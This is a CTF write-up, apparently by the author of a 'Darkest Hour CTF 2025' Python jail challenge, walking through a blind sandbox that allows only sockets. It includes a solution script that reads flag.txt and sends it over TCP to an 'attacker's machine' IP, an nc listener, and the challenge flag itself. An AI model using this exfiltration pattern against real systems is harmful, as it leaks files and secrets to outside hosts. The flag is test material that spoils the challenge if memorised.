---
title: "Escaping a Python Network Jail"
eventName: "Darkest Hour CTF 2025"
category: "Network"
difficulty: "Medium"
points: 500
---

# Challenge 3: Escaping a Python Network Jail

For the third challenge, I decided to create a **fun Python jail escape**. Players were provided with the **source code** of the challenge, which allowed them to **upload a Python file** to /upload. Once uploaded, the server would execute the script.

![Python Upload Interface](/assets/darkest/pyupload.webp)

## The Catch

There was a significant restriction: **the server wouldn’t return any output**. It would only indicate whether the script executed successfully or not, making traditional debugging difficult.

```python
script_thread = threading.Thread(target=run_script, args=(full_script, safe_globals))  
script_thread.start()  

script_thread.join(timeout=5)  

if script_thread.is_alive():  
    return "Error: Script execution exceeded the time limit of 5 seconds"  

os.remove(filepath)  
return "Script executed successfully and deleted!"  

except Exception as e:  
    return f"Error: {str(e)}"
```

At first glance, players could spend **hours analyzing all the disallowed functions** and restrictions, but the key to solving this challenge was spotting a **crucial clue** in the source code: **The only allowed module was** socket

```python
safe_globals = {  
    '__builtins__': {  
        'print': print,  
        'len': len,  
        'str': str,  
        'int': int,  
        'float': float,  
        'open': secure_open,  
        'socket': socket,  
    }  
}
```

This meant we had a way to communicate externally. But what could we do with it?

## Failed Attempt: Reverse Shell?

One might instinctively think of a **reverse shell**, but that approach was blocked because:

- **Importing additional modules was forbidden**
- **Critical modules like os and subprocess were unavailable**

So, no shell access — **but there was another way!**

## Key Hint: The Safe open() Function

```python
def secure_open(filename, mode="r", *args, **kwargs):  
    if filename != "flag.txt" or mode != "r":  
        raise PermissionError("Access to this file is restricted!")  
    return open(filename, mode, *args, **kwargs)
```

The challenge provided a function that **allowed opening only** flag.txt **in read mode**. This was a **huge hint**—since we could read the flag, we just needed a way to send it out.

And guess what? We had **socket programming** at our disposal!

## Exfiltrating the Flag Using a Socket

Since we couldn’t print the flag or return its contents directly, we could **send it over the network** to our own machine:

```python
with open("flag.txt", "r") as f:  
    flag = f.read().strip()  
ip = "192.168.153.211"  # Attacker's machine  
port = 4444  
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  
    s.connect((ip, port))  
    s.sendall(flag.encode())
```

## Receiving the Flag

On our own machine, we simply ran:

```bash
nc -lvp 4444
```

As soon as the script executed, **bingo!** The flag was sent over the network straight to us: Securinets{H0pefully_Y0u_d1dnt_destr0y_My_System}
